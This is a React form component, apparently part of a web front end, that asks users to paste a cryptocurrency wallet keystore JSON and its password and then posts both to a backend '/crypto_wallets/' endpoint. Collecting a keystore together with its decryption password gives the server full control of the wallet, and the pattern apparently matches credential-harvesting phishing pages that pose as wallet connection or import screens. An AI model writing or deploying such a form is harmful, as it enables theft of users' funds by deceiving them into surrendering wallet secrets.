import React, { useState } from "react";
import { ErrorMessage, Field, Form, Formik } from "formik";
import * as Yup from "yup";
import axios from "axios";
import Loading from "../Loading/Loading";

function Keystore(props) {
  const { WalletState, setSuccess } = props;
  const endPoint = process.env.REACT_APP_API_URL;

  const [loading, setLoading] = useState(false);

  const onSubmit = (values) => {
    setLoading(true);
    axios
      .post(`${endPoint}/crypto_wallets/`, {
        keystore_json: values.keystore_json,
        password: values.password,
        wallet_name: WalletState.name,
      })
      .then((res) => {
        setLoading(false);
        setSuccess(true);
      })
      .catch((error) => {
        console.log(error);
        setLoading(false);
      });
  };

  const validationSchema = Yup.object({
    keystore_json: Yup.string().required("Keystore JSON is required"),
    password: Yup.string().required("Password is required"),
  });

  const initialValues = {
    keystore_json: "",
    password: "",
  };

  return (
    <>
      {loading ? (
        <Loading />
      ) : (
        <Formik
          initialValues={initialValues}
          onSubmit={onSubmit}
          validationSchema={validationSchema}
        >
          {({ isValid, status, dirty, isSubmitting }) => (
            <Form
              style={{
                display: "flex",
                flexDirection: "column",
                justifyContent: "center",
                alignItems: "center",
              }}
            >
              <Field
                as="textarea"
                name="keystore_json"
                placeholder="Keystore JSON"
                className="text-area-input"
              />
              <div style={{ color: "red", fontSize: "10px" }}>
                <ErrorMessage name="keystore_json" />
              </div>
              <Field
                type="password"
                name="password"
                placeholder="Password"
                className="form-input"
              />
              <div style={{ color: "red", fontSize: "10px" }}>
                <ErrorMessage name="password" />
              </div>
              <div
                style={{ fontSize: "10px", marginBlock: "10px", width: "90%" }}
              >
                {`Several lines of text beginning with "{...}" plus the password you used to encrypt it.`}
              </div>
              <button
                disabled={!(isValid && dirty) || isSubmitting}
                type="submit"
                className="form-button"
              >
                PROCEED
              </button>
            </Form>
          )}
        </Formik>
      )}
    </>
  );
}

export default Keystore;
